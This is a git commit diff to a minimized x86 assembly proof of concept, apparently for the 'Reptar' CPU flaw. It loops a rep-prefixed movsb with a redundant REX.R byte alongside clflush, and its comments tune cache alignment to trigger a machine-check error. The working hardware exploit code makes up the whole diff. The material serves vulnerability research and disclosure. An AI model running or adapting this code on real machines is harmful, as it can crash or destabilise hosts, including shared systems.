ebd24e047aaa42a8bfa24ec3284f63beaa6f3074
eduardo <sirdarckcat@gmail.com>
2023-11-25 04:00:02 +0100

    smaller file

--- pocs/cpus/reptar/minimized/reptar.mce.asm
+++ pocs/cpus/reptar/minimized/reptar.mce.asm
@@ -4,21 +4,28 @@ global _start
 
 section .text
     _start:
-        xor rcx, rcx
         lea rsi, [rsp+1]
         mov rdi, rsi
+        align 0x1000
+        %rep 64*8
+            align 64
+            pause
+        %endrep
         .many_reptars:
-        %rep 100000
-            clflush [rdi-1]
-            clflush [rsi+63]
-            dec rsi
-            dec rdi
-            inc rcx
+        align 0x1000
+        %rep 64*8 ; icache has 8 ways 64 sets
+            align 64 ; icache line size
+            clflush [rdi-1] ; msrom ptr ; 4 bytes   ; 1 way
+            clflush [rsi+63]; msrom ptr ; 4 bytes   ; 1 way
+            dec rsi         ; 1uop      ; 3 bytes
+            dec rdi         ; 1uop      ; 3 bytes
+            inc rcx         ; 1uop      ; 3 bytes
+            times 6 nop
             rep
             db 0x44; rex.r
-            movsb
-            pause
-            pause
+            movsb           ; msrom ptr ; 3 bytes   ; 1 way
+            pause           ; 1uop      ; 2 bytes
+            pause           ; 1uop      ; 2 bytes
         %endrep
         nop
         times 1024 int3
